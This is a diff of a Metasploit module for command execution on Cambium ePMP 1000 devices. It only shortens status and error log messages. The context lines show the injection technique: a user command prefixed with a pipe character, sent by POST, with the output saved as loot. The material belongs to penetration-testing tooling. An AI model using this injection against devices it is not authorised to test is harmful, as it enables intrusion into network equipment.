@@ -57,7 +57,7 @@ class MetasploitModule < Msf::Auxiliary
     inject = '|' + "#{command}"
     clean_inject = CGI.unescapeHTML(inject.to_s)
 
-    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Executing #{command}")
+    print_status("Executing #{command}")
     res = send_request_cgi(
       {
         'method' => 'POST',
@@ -86,9 +86,9 @@ class MetasploitModule < Msf::Auxiliary
 
     if good_response
       path = store_loot('ePMP_cmd_exec', 'text/plain', rhost, res.body, 'Cambium ePMP 1000 Command Exec Results')
-      print_status("#{Rex::Socket.to_authority(rhost, rport)} - Results saved in: #{path}")
+      print_status("Results saved in: #{path}")
     else
-      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Failed to execute command(s).")
+      print_error("Failed to execute command(s).")
     end
   end
 
